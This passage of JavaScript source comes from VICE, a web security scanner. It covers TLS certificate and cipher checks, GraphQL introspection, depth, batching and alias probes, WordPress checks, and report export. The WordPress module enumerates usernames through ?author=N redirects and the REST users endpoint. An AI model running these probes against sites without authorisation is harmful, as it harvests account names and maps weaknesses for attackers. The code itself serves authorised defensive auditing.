  // Connect to gather certificate + negotiated protocol/cipher
  spinner.text = `TLS: connecting to ${host}:${port}...`;
  const certInfo = await new Promise((resolve) => {
    const signal = getScanContext()?.signal;
    let resolved = false;
    let socket = null;
    const abort = () => { socket?.destroy(); done(null); };
    const done = (val) => {
      if (!resolved) {
        resolved = true;
        signal?.removeEventListener('abort', abort);
        resolve(val);
      }
    };
    signal?.addEventListener('abort', abort, { once: true });
    try {
      socket = tls.default.connect({
        host: connectHost, port, servername: host, timeout: 6000,
        rejectUnauthorized: false,
      }, () => {
        const cert = socket.getPeerCertificate(true);
        const protocol = socket.getProtocol();
        const cipher = socket.getCipher();
        const x509 = typeof socket.getPeerX509Certificate === 'function' ? socket.getPeerX509Certificate() : null;
        const publicKey = x509?.publicKey;
        socket.end();
        done({
          cert,
          protocol,
          cipher,
          authorized: socket.authorized,
          authorizationError: socket.authorizationError || null,
          keyType: publicKey?.asymmetricKeyType || null,
          keyDetails: publicKey?.asymmetricKeyDetails || null,
        });
      });
      socket.on('error', () => done(null));
      socket.on('timeout', () => { socket.destroy(); done(null); });
    } catch {
      done(null);
    }
  });

  if (!certInfo || !certInfo.cert || !certInfo.cert.valid_to) {
    addFinding('INFO', 'TLS', 'TLS handshake failed', `Could not complete TLS handshake with ${host}:${port}`, 'Verify the host accepts TLS connections on port 443');
    return;
  }

  const cert = certInfo.cert;
  const authorization = classifyTlsAuthorization(certInfo.authorized, certInfo.authorizationError);
  if (authorization) {
    addFinding(authorization.severity, 'TLS', authorization.title, `Validation error: ${authorization.error}\nHost: ${host}`, 'Install a certificate whose chain is trusted and whose SAN entries include the scanned hostname.');
  }

  const keyIssue = classifyTlsPublicKey(certInfo.keyType, certInfo.keyDetails || {});
  if (keyIssue) {
    addFinding(keyIssue.severity, 'TLS', keyIssue.title, `Key type: ${certInfo.keyType}\nDetails: ${JSON.stringify(certInfo.keyDetails)}`, 'Use RSA 2048 bits or stronger, or a modern EC key with at least 256-bit security parameters.');
  }

  // Issuer / self-signed (computed before expiration check so we can adjust
  // severity based on the CA - Let's Encrypt certs are 90 days with standard
  // auto-renew at ~30 days remaining, so "25 days left" is normal there).
  const issuerCN = (cert.issuer && (cert.issuer.O || cert.issuer.CN)) || 'unknown';
  const isShortLivedCA = /let'?s encrypt|zerossl|google trust services|buypass go ssl/i.test(issuerCN);

  // Certificate expiration
  const validTo = new Date(cert.valid_to);
  const daysLeft = Math.floor((validTo.getTime() - Date.now()) / (1000 * 60 * 60 * 24));
  if (daysLeft < 0) {
    addFinding('CRITIQUE', 'TLS', `Certificate EXPIRED ${Math.abs(daysLeft)} day(s) ago`, `Expired on ${cert.valid_to}\nBrowsers will refuse to connect.`, 'Renew the certificate immediately');
  } else if (daysLeft < 7) {
    addFinding('ELEVEE', 'TLS', `Certificate expires in ${daysLeft} day(s)`, `Expires on ${cert.valid_to}\nIssuer: ${issuerCN}`, 'Renew immediately. Verify auto-renewal is configured (certbot --renew, caddy auto-renew, etc.)');
  } else if (daysLeft < 14) {
    addFinding('MOYENNE', 'TLS', `Certificate expires in ${daysLeft} day(s)`, `Expires on ${cert.valid_to}\nIssuer: ${issuerCN}`, 'Renew now or verify auto-renewal is configured.');
  } else if (daysLeft < 30) {
    // Short-lived CAs (Let's Encrypt 90-day certs) typically auto-renew at ~30
    // days remaining, so this window is normal for correctly-configured sites.
    if (isShortLivedCA) {
      addFinding('INFO', 'TLS', `Certificate expires in ${daysLeft} day(s) (auto-renew window)`, `Expires on ${cert.valid_to}\nIssuer: ${issuerCN} - typically auto-renewed at ~30 days remaining.`, '');
    } else {
      addFinding('MOYENNE', 'TLS', `Certificate expires in ${daysLeft} day(s)`, `Expires on ${cert.valid_to}\nIssuer: ${issuerCN}`, 'Plan renewal soon. Configure auto-renewal if not already.');
    }
  } else {
    addFinding('INFO', 'TLS', `Certificate valid until ${cert.valid_to}`, `${daysLeft} days remaining`, '');
  }
  const subjectCN = (cert.subject && cert.subject.CN) || 'unknown';
  addFinding('INFO', 'TLS', `Certificate issued by ${issuerCN}`, `Subject: ${subjectCN}\nSerial: ${cert.serialNumber || 'unknown'}`, '');
  if (!authorization && cert.issuer && cert.subject && cert.issuer.CN === cert.subject.CN && cert.issuer.O === cert.subject.O) {
    addFinding('ELEVEE', 'TLS', 'Self-signed certificate', `Issuer and subject match (${cert.issuer.CN}). Browsers will warn users.`, 'Switch to a CA-signed cert (Let\'s Encrypt is free)');
  }

  // Wildcard certs
  if (subjectCN.startsWith('*.')) {
    addFinding('INFO', 'TLS', `Wildcard certificate (${subjectCN})`, 'Wildcard certs cover all subdomains. If the private key leaks, every subdomain is impacted.', 'For sensitive services, consider per-host certs.');
  }

  // Negotiated protocol
  const protocol = certInfo.protocol || 'unknown';
  addFinding('INFO', 'TLS', `Negotiated protocol: ${protocol}`, certInfo.cipher ? `Cipher: ${certInfo.cipher.name} (${certInfo.cipher.version})` : '', '');

  // Weak cipher
  if (certInfo.cipher && /\b(?:RC4|DES|3DES|MD5|EXPORT|NULL|anon)\b/i.test(certInfo.cipher.name)) {
    addFinding('CRITIQUE', 'TLS', `Weak cipher suite: ${certInfo.cipher.name}`, '', 'Disable weak ciphers in your TLS config. Recommended: TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256, ECDHE-RSA-AES256-GCM-SHA384.');
  }

  // Test deprecated TLS versions
  spinner.text = 'TLS: probing legacy protocol versions...';
  for (const oldVer of ['TLSv1', 'TLSv1.1']) {
    const supported = await new Promise((resolve) => {
      let resolved = false;
      const done = (v) => { if (!resolved) { resolved = true; resolve(v); } };
      try {
        const socket = tls.default.connect({
          host, port, servername: host, timeout: 4000,
          minVersion: oldVer, maxVersion: oldVer,
          rejectUnauthorized: false,
        }, () => { socket.end(); done(true); });
        socket.on('error', () => done(false));
        socket.on('timeout', () => { socket.destroy(); done(false); });
      } catch {
        done(false);
      }
    });
    if (supported) {
      addFinding('ELEVEE', 'TLS', `${oldVer} accepted (deprecated)`, `${oldVer} has known vulnerabilities (BEAST, POODLE, etc.) and is removed from modern browsers.`, `Disable ${oldVer} in nginx: ssl_protocols TLSv1.2 TLSv1.3;\nIn Apache: SSLProtocol -all +TLSv1.2 +TLSv1.3`);
    }
  }
}

// ──────────── MODULE 17 : GraphQL Endpoint Tests ────────────

async function testGraphQLEndpoint(endpoint, spinner) {
  // 1. Introspection query - also doubles as the "is this really GraphQL" probe.
  // Many SPAs return 200 HTML for /graphql due to catch-all routing; we must NOT
  // run the depth-limit and field-suggestions tests on those (false positives).
  spinner.text = `GraphQL: testing introspection on ${endpoint}...`;
  const introspectionQuery = '{ __schema { queryType { name } mutationType { name } types { name } } }';
  const introRes = await safeFetch(endpoint, {
    method: 'POST',
    readOnly: 'graphql-query',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ query: introspectionQuery }),
  });

  if (!introRes) return;
  let body;
  try { body = await introRes.text(); } catch { return; }

  // Identify whether this is actually a GraphQL endpoint.
  // A real GraphQL response is JSON with `data` and/or `errors` fields.
  // HTML, plain text, redirects, 404s all mean: not GraphQL, skip everything.
  let parsedIntro;
  try { parsedIntro = JSON.parse(body); } catch {}
  const isGraphQL = parsedIntro && (parsedIntro.data !== undefined || Array.isArray(parsedIntro.errors));
  if (!isGraphQL) return;

  if (introRes.status === 200 && parsedIntro.data && parsedIntro.data.__schema) {
    const typeCount = parsedIntro.data.__schema.types?.length || '?';
    const hasMutation = !!parsedIntro.data.__schema.mutationType?.name;
    addFinding(classifyHardeningSignal('graphql-introspection').severity, 'GraphQL', `Introspection enabled on ${endpoint}`,
      `Schema introspection returned ${typeCount} type(s)${hasMutation ? ' and declares mutations' : ''}. Introspection reveals schema metadata but does not bypass resolver authorization.`,
      'Keep introspection when it is an intentional developer feature. Disable it only when schema exposure conflicts with the deployment policy.');
  }

  // 2. Query depth limit - use recursive introspection fields so the query is
  // valid on every spec-compliant schema when introspection is available.
  spinner.text = `GraphQL: testing query depth on ${endpoint}...`;
  const deepQuery = '{ __type(name: "Query") { fields { type { ' + 'ofType { '.repeat(15) + 'kind' + ' }'.repeat(15) + ' } } } }';
  const deepRes = await safeFetch(endpoint, {
    method: 'POST',
    readOnly: 'graphql-query',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ query: deepQuery }),
  });
  if (deepRes) {
    let depthBody = '';
    try { depthBody = await deepRes.text(); } catch {}
    let parsedDepth;
    try { parsedDepth = JSON.parse(depthBody); } catch {}
    const depthResult = classifyGraphqlDepthResponse(parsedDepth, deepRes.status);
    if (depthResult?.kind === 'accepted') {
      addFinding('MOYENNE', 'GraphQL', `Deep GraphQL query accepted on ${endpoint}`,
        'Server returned data for a valid 15-level recursive type query without a depth or complexity rejection.',
        'Apply a query depth or cost policy appropriate to the production schema.',
        { classification: 'confirmed', confidence: 'high', rule_id: 'vice/graphql/deep-query-accepted' });
    } else if (depthResult?.kind === 'protected') {
      addFinding('INFO', 'GraphQL', `Query depth protection detected on ${endpoint}`,
        'The server rejected the deep query with an explicit depth or complexity limit.', '');
    }
  }

  // 3. Field suggestions - intentional typo, look for "Did you mean..."
  spinner.text = `GraphQL: testing field suggestions on ${endpoint}...`;
  const typoRes = await safeFetch(endpoint, {
    method: 'POST',
    readOnly: 'graphql-query',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ query: '{ querType { name } }' }),
  });
  if (typoRes) {
    let typoBody = '';
    try { typoBody = await typoRes.text(); } catch {}
    if (/did you mean/i.test(typoBody)) {
      addFinding(classifyHardeningSignal('graphql-suggestions').severity, 'GraphQL', `Field suggestions enabled on ${endpoint}`,
        'Server returns "Did you mean ..." messages on typos. Attackers use this to enumerate the schema even with introspection disabled.',
        'Disable field suggestions. Apollo: validationRules including NoFieldSuggestionsRule. graphql-js: --no-suggestions or custom validation.');
    }
  }

  // 4. Bounded batching capability. Support alone is inventory, not a vulnerability.
  spinner.text = `GraphQL: testing bounded batching on ${endpoint}...`;
  const batchRes = await safeFetch(endpoint, {
    method: 'POST',
    readOnly: 'graphql-query',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify([{ query: '{ __typename }' }, { query: '{ __typename }' }]),
  });
  if (batchRes) {
    let batchPayload;
    try { batchPayload = JSON.parse(await batchRes.text()); } catch {}
    const batch = classifyGraphqlBatchResponse(batchPayload, batchRes.status, 2);
    if (batch?.kind === 'supported') {
      addFinding('INFO', 'GraphQL', `GraphQL batching supported on ${endpoint}`, 'A bounded batch of two trivial operations returned two GraphQL responses. Batching support is not a vulnerability by itself.', 'Apply per-operation and aggregate batch cost limits.', { classification: 'confirmed', confidence: 'high', rule_id: 'vice/graphql/batching-supported' });
    } else if (batch?.kind === 'protected') {
      addFinding('INFO', 'GraphQL', `GraphQL batching rejected on ${endpoint}`, 'The server explicitly rejected the bounded batch request.', '', { classification: 'confirmed', confidence: 'high', rule_id: 'vice/graphql/batching-rejected' });
    }
  }

  // 5. Bounded alias/cost probe with trivial fields and no expensive resolver.
  spinner.text = `GraphQL: testing bounded alias cost on ${endpoint}...`;
  const aliasCount = 20;
  const aliasQuery = `{ ${Array.from({ length: aliasCount }, (_, index) => `viceAlias${index}: __typename`).join(' ')} }`;
  const aliasRes = await safeFetch(endpoint, {
    method: 'POST',
    readOnly: 'graphql-query',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ query: aliasQuery }),
  });
  if (aliasRes) {
    let aliasPayload;
    try { aliasPayload = JSON.parse(await aliasRes.text()); } catch {}
    const alias = classifyGraphqlAliasResponse(aliasPayload, aliasRes.status, aliasCount);
    if (alias?.kind === 'accepted') {
      addFinding('INFO', 'GraphQL', `Bounded alias query accepted on ${endpoint}`, `${aliasCount} trivial aliases were resolved. This only inventories cost-policy behavior and does not prove denial-of-service exposure.`, 'Use aggregate query cost limits for expensive production resolvers.', { classification: 'confirmed', confidence: 'high', rule_id: 'vice/graphql/bounded-alias-accepted' });
    } else if (alias?.kind === 'protected') {
      addFinding('INFO', 'GraphQL', `GraphQL cost protection detected on ${endpoint}`, 'The server explicitly rejected the bounded alias query using a complexity or cost rule.', '', { classification: 'confirmed', confidence: 'high', rule_id: 'vice/graphql/cost-protected' });
    }
  }
}

// ──────────── MODULE 18 : WordPress Specifics ────────────

async function auditWordPress(baseUrl, jsContents, spinner) {
  // Detect WordPress via markers in HTML/JS - skip silently if not WP
  const allContent = jsContents.join('\n');
  const wpDetected = /wp-content\/|wp-includes\/|wp-json|wordpress/i.test(allContent);
  if (!wpDetected) {
    addFinding('INFO', 'WordPress', 'WordPress not detected on target', '', '');
    return;
  }

  addFinding('INFO', 'WordPress', 'WordPress detected - running WP-specific checks', '', '');
  const origin = new URL(baseUrl).origin;

  // 1. User enumeration via ?author=N (redirects to /author/{username}/)
  spinner.text = 'WordPress: enumerating users via ?author=N...';
  const usernames = new Set();
  for (let i = 1; i <= 10; i++) {
    try {
      const res = await safeFetch(`${origin}/?author=${i}`, { timeoutMs: 5000, redirect: 'manual', cache: 'no-store' });
      if (!res) continue;
      const location = res.headers.get('location') || '';
      const m = location.match(/\/author\/([^\/?#]+)/i);
      if (m) usernames.add(m[1]);
    } catch {}
  }
  if (usernames.size > 0) {
    const signal = classifyWordpressSurface('author-enumeration');
    addFinding(signal.severity, 'WordPress',
      `User enumeration via ?author=N - ${usernames.size} username(s) leaked`,
      `Usernames: ${[...usernames].join(', ')}\nWordPress redirects /?author=N to /author/{username}/, leaking the login slug. Combined with the wp-login.php endpoint, this lets attackers brute-force exact accounts.`,
      'Limit login attempts and enable MFA. Hide author slugs only if they are not intentionally public.',
      { classification: signal.classification, confidence: signal.confidence, rule_id: 'vice/wordpress/author-enumeration' });
  }

  // 2. /wp-json/wp/v2/users exposes user list
  spinner.text = 'WordPress: testing /wp-json/wp/v2/users...';
  const usersRes = await safeFetch(`${origin}/wp-json/wp/v2/users`);
  if (usersRes && usersRes.status === 200) {
    let users;
    try { users = await usersRes.json(); } catch {}
    if (Array.isArray(users) && users.length > 0) {
      const slugs = users.slice(0, 10).map(u => u.slug || u.name).filter(Boolean).join(', ');
      const signal = classifyWordpressSurface('rest-users');
      addFinding(signal.severity, 'WordPress',
        `/wp-json/wp/v2/users exposes ${users.length} user(s)`,
        `Slugs: ${slugs}\nThe REST API exposes the list of registered users including their login slugs.`,
        'Restrict the endpoint when author identities are not intentionally public, and protect login with rate limits and MFA.',
        { classification: signal.classification, confidence: signal.confidence, rule_id: 'vice/wordpress/rest-users' });
    }
  }

  // 3. xmlrpc.php (often exposed, used for brute-force amplification)
  spinner.text = 'WordPress: testing xmlrpc.php...';
  const xmlrpcRes = await safeFetch(`${origin}/xmlrpc.php`);
  if (xmlrpcRes && (xmlrpcRes.status === 200 || xmlrpcRes.status === 405)) {
    let body = '';
    try { body = await xmlrpcRes.text(); } catch {}
    const isActive = /XML-RPC server accepts POST requests only|methodCall/i.test(body) || xmlrpcRes.status === 405;
    if (isActive) {
      const signal = classifyWordpressSurface('xmlrpc');
      addFinding(signal.severity, 'WordPress',
        'xmlrpc.php exposed',
        `XML-RPC API is reachable. system.multicall lets attackers test thousands of password attempts in a single request, bypassing typical rate limiting.`,
        'Disable XML-RPC if unused, or enforce authentication and rate limiting.',
        { classification: signal.classification, confidence: signal.confidence, rule_id: 'vice/wordpress/xmlrpc' });
    }
  }

  // 4. wp-login.php at the default path
  spinner.text = 'WordPress: testing wp-login.php...';
  const loginRes = await safeFetch(`${origin}/wp-login.php`);
  if (loginRes && loginRes.status === 200) {
    const signal = classifyWordpressSurface('default-login');
    addFinding(signal.severity, 'WordPress',
      'wp-login.php at default path',
      'The standard WordPress login path is reachable. This is normal and does not prove weak authentication.',
      'Use MFA, strong passwords and rate limiting instead of relying on a hidden login URL.',
      { classification: signal.classification, confidence: signal.confidence, rule_id: 'vice/wordpress/default-login' });
  }

  // 5. wp-cron.php (DoS amplifier on shared hosting)
  const cronRes = await safeFetch(`${origin}/wp-cron.php`);
  if (cronRes && cronRes.status === 200) {
    const signal = classifyWordpressSurface('http-cron');
    addFinding(signal.severity, 'WordPress',
      'wp-cron.php publicly accessible',
      'The HTTP cron endpoint responded, but this alone does not prove exploitable resource exhaustion.',
      'For high-traffic sites, consider disabling HTTP cron and using a system scheduler.',
      { classification: signal.classification, confidence: signal.confidence, rule_id: 'vice/wordpress/http-cron' });
  }
}

// ──────────── SCORE DE SECURITE ────────────

export function calculateScanScore(sourceFindings = findings) {
  return calculateCoreScore(sourceFindings, { minConfidence: 'medium' });
}

// ──────────── RAPPORT ────────────

function printReport() {
  const { score, grade, color } = calculateScanScore();

  console.log('\n');
  console.log(chalk.bold('━'.repeat(60)));
  console.log(chalk.hex('#995ff6').bold('  VICE') + chalk.gray(' - Rapport d\'audit de securite'));
  console.log(chalk.gray('  Webba Creative Technologies'));
  console.log(chalk.bold('━'.repeat(60)));

  // Score
  console.log('');
  console.log(`  Score de securite: ${color(` ${grade} `)} ${chalk.gray(`(${score}/100)`)}`);

  if (findings.length === 0) {
    console.log(chalk.green('\n  Aucune faille detectee. Bon travail !\n'));
    return;
  }

  const order = ['CRITIQUE', 'ELEVEE', 'MOYENNE', 'FAIBLE', 'INFO'];
  const sorted = findings.sort((a, b) => order.indexOf(a.severity) - order.indexOf(b.severity));

  const counts = {};
  for (const f of findings) {
    counts[f.severity] = (counts[f.severity] || 0) + 1;
  }

  console.log('');
  for (const sev of order) {
    if (counts[sev]) {
      console.log(`  ${severityColor(sev)} ${counts[sev]} finding(s)`);
    }
  }
  console.log('');
  console.log(chalk.bold('─'.repeat(60)));

  let currentModule = '';
  for (const f of sorted) {
    if (f.module !== currentModule) {
      currentModule = f.module;
      console.log(chalk.bold.underline(`\n  ${currentModule}`));
    }

    console.log(`\n  ${severityColor(f.severity)} ${chalk.bold(f.title)}`);
    console.log(chalk.gray(`    ${f.detail}`));
    if (f.recommendation) {
      console.log(chalk.green(`    → ${f.recommendation}`));
    }
  }

  console.log('\n' + chalk.bold('━'.repeat(60)));
  console.log(`  Score: ${color(` ${grade} `)} (${score}/100) - Total: ${findings.length} finding(s)`);
  console.log(chalk.gray(`  VICE v${ENGINE_VERSION} - Webba Creative Technologies (c) 2026`));
  console.log(chalk.bold('━'.repeat(60)) + '\n');
}

export function buildBlackBoxReport(url, result = null, date = new Date().toISOString()) {
  const calculated = result?.score_breakdown || calculateScanScore(result?.findings || findings);
  const hasResultScore = result && Object.hasOwn(result, 'score');
  const hasResultGrade = result && Object.hasOwn(result, 'grade');
  return {
    url,
    date,
    score: hasResultScore ? result.score : calculated.score,
    grade: hasResultGrade ? result.grade : calculated.grade,
    engine_version: result?.engine_version || ENGINE_VERSION,
    ruleset_version: result?.ruleset_version || RULESET_VERSION,
    scoring_version: result?.scoring_version || SCORING_VERSION,
    score_reliable: result?.score_reliable ?? null,
    modules: result?.modules || null,
    errors: result?.errors || [],
    metrics: result?.metrics || null,
    coverage: result?.coverage || null,
    ai_rag_audit: result?.ai_rag_audit || null,
    score_breakdown: {
      total_penalty: calculated.total_penalty,
      breakdown: calculated.breakdown,
      excluded: calculated.excluded,
      min_confidence: calculated.min_confidence,
    },
    completed_at: result?.completed_at || null,
    findings: result?.findings || findings,
  };
}

async function exportJson(url, result = null) {
  const fs = await import('fs');
  const path = await import('path');
  const dir = path.default.join(getViceDataDir(), 'scans');
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  const filename = path.default.join(dir, `vice-report-${new URL(url).hostname}-${Date.now()}.json`);
  fs.writeFileSync(filename, JSON.stringify(buildBlackBoxReport(url, result), null, 2));
  console.log(chalk.gray(`  Rapport JSON exporte: ${filename}\n`));
}

async function exportHtml(url) {
  const { score, grade } = calculateScanScore();
  const hostname = new URL(url).hostname;
  const fs = await import('fs');
  const path = await import('path');
  const dir = path.default.join(getViceDataDir(), 'scans');
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  const filename = path.default.join(dir, `vice-report-${hostname}-${Date.now()}.html`);
  const safeHostname = escapeHtml(hostname);
  const safeUrl = escapeHtml(url);

  const allSevs = ['CRITICAL','CRITIQUE','HIGH','ELEVEE','MEDIUM','MOYENNE','LOW','FAIBLE','INFO'];
  const sevOrder = {CRITICAL:0,CRITIQUE:0,HIGH:1,ELEVEE:1,MEDIUM:2,MOYENNE:2,LOW:3,FAIBLE:3,INFO:4};
  const counts = {};
  for (const f of findings) counts[f.severity] = (counts[f.severity] || 0) + 1;
  const sorted = [...findings].sort((a,b) => (sevOrder[a.severity]??5) - (sevOrder[b.severity]??5));
  const sevColors = {CRITICAL:'#c0392b',CRITIQUE:'#c0392b',HIGH:'#d35400',ELEVEE:'#d35400',MEDIUM:'#b8860b',MOYENNE:'#b8860b',LOW:'#5b7ea1',FAIBLE:'#5b7ea1',INFO:'#8e99a4'};
  const sevLabels = {CRITICAL:'Critical',CRITIQUE:'Critical',HIGH:'High',ELEVEE:'High',MEDIUM:'Medium',MOYENNE:'Medium',LOW:'Low',FAIBLE:'Low',INFO:'Info'};
  const gradeColors = {A:'#27ae60',B:'#2e86c1',C:'#b8860b',D:'#c0392b',E:'#7b241c',F:'#4a1410'};
  let findingsHtml = '';
  let currentModule = '';
  for (const f of sorted) {
    if (f.module !== currentModule) { currentModule = f.module; findingsHtml += `<div class="module-title">${escapeHtml(currentModule)}</div>`; }
    const detail = escapeHtml(f.detail);
    const reco = escapeHtml(f.recommendation);
    findingsHtml += `<div class="finding"><div class="finding-header"><span class="badge" style="background:${sevColors[f.severity]||'#888'}">${escapeHtml(sevLabels[f.severity]||f.severity)}</span><span class="finding-title">${escapeHtml(f.title)}</span></div>${detail?`<pre class="finding-detail">${detail}</pre>`:''}${reco?`<div class="finding-reco">${reco}</div>`:''}</div>`;
  }
  const statsHtml = allSevs.filter(s=>counts[s]).map(s=>`<span class="stat-pill" style="background:${sevColors[s]}">${sevLabels[s]} ${counts[s]}</span>`).join('');
  const dateStr = new Date().toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'});
  const timeStr = new Date().toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'});
  const html = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:; base-uri 'none'; form-action 'none'"><title>VICE Report - ${safeHostname}</title><style>:root{--primary:#995ff6;--accent:#ee967a;--bg:#fafafa;--card:#fff;--text:#2c2c2c;--text-light:#6b6b6b;--text-muted:#9a9a9a;--border:#e8e8e8}*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);line-height:1.6;-webkit-font-smoothing:antialiased}.container{max-width:780px;margin:0 auto;padding:48px 24px 64px}.header{margin-bottom:48px}.header-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:32px}.logo{font-size:14px;font-weight:600;color:var(--primary);letter-spacing:2px;text-transform:uppercase}.date{font-size:13px;color:var(--text-muted)}.target{font-size:28px;font-weight:700;color:var(--text);margin-bottom:4px;word-break:break-all}.target-url{font-size:14px;color:var(--text-light);margin-bottom:32px}.score-section{display:flex;align-items:center;gap:24px;padding:28px 32px;background:var(--card);border:1px solid var(--border);border-radius:12px;margin-bottom:24px}.grade-circle{width:72px;height:72px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:32px;font-weight:800;color:#fff;flex-shrink:0}.score-info{flex:1}.score-number{font-size:20px;font-weight:700;color:var(--text)}.score-label{font-size:13px;color:var(--text-muted);margin-top:2px}.stats{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:40px}.stat-pill{display:inline-block;padding:4px 14px;border-radius:100px;font-size:12px;font-weight:600;color:#fff;letter-spacing:.3px}.module-title{font-size:16px;font-weight:700;color:var(--text);margin-top:36px;margin-bottom:16px;padding-bottom:8px;border-bottom:1px solid var(--border)}.module-title:first-child{margin-top:0}.finding{padding:16px 20px;background:var(--card);border:1px solid var(--border);border-radius:8px;margin-bottom:10px}.finding-header{display:flex;align-items:flex-start;gap:10px;margin-bottom:6px}.badge{display:inline-block;padding:2px 10px;border-radius:4px;font-size:11px;font-weight:700;color:#fff;text-transform:uppercase;letter-spacing:.5px;flex-shrink:0;margin-top:2px}.finding-title{font-size:14px;font-weight:600;color:var(--text);line-height:1.4}.finding-detail{font-family:'SF Mono','Fira Code','Consolas',monospace;font-size:12px;line-height:1.5;color:var(--text-light);background:#f5f5f5;border:1px solid var(--border);border-radius:6px;padding:12px 14px;margin:8px 0;white-space:pre-wrap;word-break:break-word;overflow-x:auto}.finding-reco{font-size:13px;color:#27ae60;margin-top:8px;padding-left:2px;line-height:1.5}.finding-reco::before{content:"\\2192  "}.footer{margin-top:56px;padding-top:24px;border-top:1px solid var(--border);text-align:center;font-size:12px;color:var(--text-muted);line-height:1.8}.footer a{color:var(--primary);text-decoration:none}.footer a:hover{text-decoration:underline}@media(max-width:600px){.container{padding:24px 16px 48px}.header-top{flex-direction:column;align-items:flex-start;gap:8px}.target{font-size:22px}.score-section{flex-direction:column;text-align:center;padding:24px}.finding-header{flex-direction:column;gap:6px}}</style></head><body><div class="container"><div class="header"><div class="header-top"><div class="logo">VICE</div><div class="date">${dateStr} at ${timeStr}</div></div><div class="target">${safeHostname}</div><div class="target-url">${safeUrl}</div></div><div class="score-section"><div class="grade-circle" style="background:${gradeColors[grade]||'#888'}">${grade}</div><div class="score-info"><div class="score-number">${score} / 100</div><div class="score-label">${findings.length} finding${findings.length!==1?'s':''} detected</div></div></div><div class="stats">${statsHtml}</div>${findingsHtml}<div class="footer">Generated by <a href="https://github.com/Webba-Creative-Technologies/vice">VICE</a> v3.0<br><a href="https://webba-creative.com">Webba Creative Technologies</a> &copy; 2026<br>This tool is intended for authorized security testing only.</div></div></body></html>`;
  fs.writeFileSync(filename, html.replace('VICE</a> v3.0<br>', `VICE</a> v${ENGINE_VERSION}<br>`));
  console.log(chalk.gray(`  HTML report exported: ${filename}\n`));
}

// ──────────── HISTORIQUE DES SCANS ────────────

async function viewHistory() {
  const fs = await import('fs');
  const path = await import('path');
  const dir = path.default.join(getViceDataDir(), 'scans');

  if (!fs.existsSync(dir)) {
    console.log(chalk.yellow('\n  Aucun scan sauvegarde. Lancez un nouveau scan.\n'));
    return;
  }

  const files = fs.readdirSync(dir)
    .filter(f => f.endsWith('.json'))
    .sort()
    .reverse();

  if (files.length === 0) {
    console.log(chalk.yellow('\n  Aucun scan sauvegarde. Lancez un nouveau scan.\n'));
    return;
  }

  // Charger les metadonnees de chaque scan
  const scans = [];
  for (const file of files) {
    try {
      const data = JSON.parse(fs.readFileSync(path.default.join(dir, file), 'utf-8'));
      const date = new Date(data.date).toLocaleDateString('fr-FR', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' });
      const hostname = new URL(data.url).hostname;
      const grade = data.grade || '?';
      const score = data.score ?? '?';
      const nbFindings = data.findings?.length || 0;
      const critiques = data.findings?.filter(f => f.severity === 'CRITIQUE').length || 0;
      scans.push({ file, date, hostname, grade, score, nbFindings, critiques, data });
    } catch {}
  }

  if (scans.length === 0) {
    console.log(chalk.yellow('\n  Aucun scan valide trouve.\n'));
    return;
  }

  const gradeColor = (g) => {
    const map = { A: chalk.green, B: chalk.cyan, C: chalk.yellow, D: chalk.red, E: chalk.bgRed.white, F: chalk.bgRed.white };
    return (map[g] || chalk.white)(`[${g}]`);
  };

  const { selectedScan } = await inquirer.prompt([
    {
      type: 'list',
      name: 'selectedScan',
      message: chalk.bold('Selectionner un scan:'),
      choices: scans.map((s, i) => ({
        name: `${gradeColor(s.grade)} ${s.score}/100 - ${s.hostname} - ${s.date} - ${s.nbFindings} findings (${s.critiques} critiques)`,
        value: i,
      })),
      pageSize: 15,
    },
  ]);

  const scan = scans[selectedScan];

  // Afficher le rapport
  console.log('\n');
  console.log(chalk.bold('━'.repeat(60)));
  console.log(chalk.hex('#995ff6').bold('  VICE') + chalk.gray(' - Rapport sauvegarde'));
  console.log(chalk.gray(`  ${scan.hostname} - ${scan.date}`));
  console.log(chalk.gray('  Webba Creative Technologies'));
  console.log(chalk.bold('━'.repeat(60)));

  const gradeColors = { A: chalk.green.bold, B: chalk.cyan.bold, C: chalk.yellow.bold, D: chalk.red.bold, E: chalk.bgRed.white.bold, F: chalk.bgRed.white.bold };
  const gradeColorFn = gradeColors[scan.grade] || chalk.white;
  console.log(`\n  Score: ${gradeColorFn(` ${scan.grade} `)} ${chalk.gray(`(${scan.score}/100)`)}`);

  const order = ['CRITIQUE', 'ELEVEE', 'MOYENNE', 'FAIBLE', 'INFO'];
  const counts = {};
  for (const f of scan.data.findings) counts[f.severity] = (counts[f.severity] || 0) + 1;

  console.log('');
  for (const sev of order) {
    if (counts[sev]) {
      console.log(`  ${severityColor(sev)} ${counts[sev]} finding(s)`);
    }
  }
  console.log('');
  console.log(chalk.bold('─'.repeat(60)));

  const sorted = scan.data.findings.sort((a, b) => order.indexOf(a.severity) - order.indexOf(b.severity));
  let currentModule = '';
  for (const f of sorted) {
    if (f.module !== currentModule) {
      currentModule = f.module;
      console.log(chalk.bold.underline(`\n  ${currentModule}`));
    }
    console.log(`\n  ${severityColor(f.severity)} ${chalk.bold(f.title)}`);
    console.log(chalk.gray(`    ${f.detail}`));
    if (f.recommendation) {
      console.log(chalk.green(`    → ${f.recommendation}`));
    }
  }

  console.log('\n' + chalk.bold('━'.repeat(60)));
  console.log(`  Score: ${gradeColorFn(` ${scan.grade} `)} (${scan.score}/100) - Total: ${scan.nbFindings} finding(s)`);
  console.log(chalk.gray(`  VICE v${ENGINE_VERSION} - Webba Creative Technologies (c) 2026`));
